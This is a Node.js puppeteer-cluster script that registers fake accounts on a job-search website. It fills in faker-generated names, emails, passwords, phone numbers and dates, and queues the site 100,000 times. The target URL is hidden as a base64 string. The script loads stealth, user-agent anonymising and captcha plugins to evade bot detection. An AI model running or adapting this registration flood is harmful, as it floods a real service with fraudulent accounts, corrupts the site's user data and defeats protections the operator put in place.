const faker = require('faker');
const {
    Cluster
} = require('puppeteer-cluster')
const vanillaPuppeteer = require('puppeteer')
const txtgen = require('txtgen');
const {
    addExtra
} = require('puppeteer-extra')
const Stealth = require('puppeteer-extra-plugin-stealth')
const Recaptcha = require('puppeteer-extra-plugin-recaptcha');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker')
const userAgent = require('user-agents');
const DateGenerator = require('random-date-generator');
const publicIp = require('public-ip');
const date = require('date-and-time')

async function main() {
    // Create a custom puppeteer-extra instance using `addExtra`,
    // so we could create additional ones with different plugin config.
    const puppeteer = addExtra(vanillaPuppeteer)
    puppeteer.use(Stealth())
    puppeteer.use(AdblockerPlugin({
        blockTrackers: true
    }))
    puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')())
    puppeteer.use(require('puppeteer-extra-plugin-block-resources')({
        blockedTypes: new Set(['image', 'stylesheet', 'media'])
    }))

    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 4,
        timeout: 30000,
        puppeteerOptions: {
            headless: true
        }
    });
    // Event handler to be called in case of problems
    cluster.on('taskerror', (err, data) => {
        console.log(`Exception in ${data}: ${err.message}`);
    });

    await cluster.task(async ({
        page,
        data: url
    }) => {
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (req.resourceType() === 'image') {
                req.abort();
            } else {
                req.continue();
            }
        });

        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 0
        });
        await page.evaluate(() => {
            document.querySelector('a.jobsearch-open-register-tab').click()
        });

        let firstName = faker.name.firstName()
        let lastName = faker.name.lastName()
        let userName = faker.internet.userName()
        let email = faker.internet.email()
        let password = faker.internet.password()

        await page.waitForSelector('input[name="pt_user_fname"]')

        await page.evaluate((firstName) => {
            document.querySelector('input[name="pt_user_fname"]').value = firstName
        }, firstName)
        await page.type('input[name="pt_user_lname"]', lastName)

        await page.type('input.jobsearch-regrequire-field[name="pt_user_login"]', userName)

        await page.type('input[name="pt_user_email"]', email)

        await page.type('input.jobsearch_chk_passfield[name="pt_user_pass"]', password)
        await page.type('input[name="pt_user_cpass"]', password)

        await page.waitForSelector('input[name="pt_user_phone"]')
        await page.click('input[name="pt_user_phone"]')
        await page.waitForTimeout(1000)
        await page.click('input[name="pt_user_phone"]')

        await page.evaluate(() => {
            document.querySelector('input[name="pt_user_phone"]').value = Math.random().toString().slice(2, 10);
        });

        // await page.click('input[placeholder="Select Sector"]')
        // sectors = [63, 58, 57, 66, 34, 60, 61, 59, 670, 62, 65, 71, 56, 64, 667, 668]
        // randomIndex = Math.floor(Math.random() * sectors.length);
        // await page.click(`div.option[data-value="${sectors[randomIndex]}"]`)

        let startDate = new Date(2017, 2, 2);
        let endDate = new Date(2022, 3, 15);
        let graduationDate = date.format(DateGenerator.getRandomDateInRange(startDate, endDate), 'DD-MM-YYYY');

        await page.type('input[name="year-of-admission"]', graduationDate)

        await page.click('input[name="terms_cond_check"]')
        await page.click('input[name="mc4wp-subscribe"]')

        await page.click('input[placeholder="Graduated"]')
        await page.click('div.option[data-value="yes"]')

        await page.click('input.jobsearch-register-submit-btn')

        console.log(`Registration Complete: ${firstName} ${lastName} - ${email} - ${password}`)
    });

    for (let i = 0; i < 100000; i++) {
        cluster.queue(Buffer.from("aHR0cHM6Ly93d3cudGhlaGtpcC5jb20v", 'base64').toString('binary'))
    }

    console.log(`Current Public IP: ${await publicIp.v4()}`)

    await cluster.idle();
    await cluster.close();
}

main().catch(console.warn)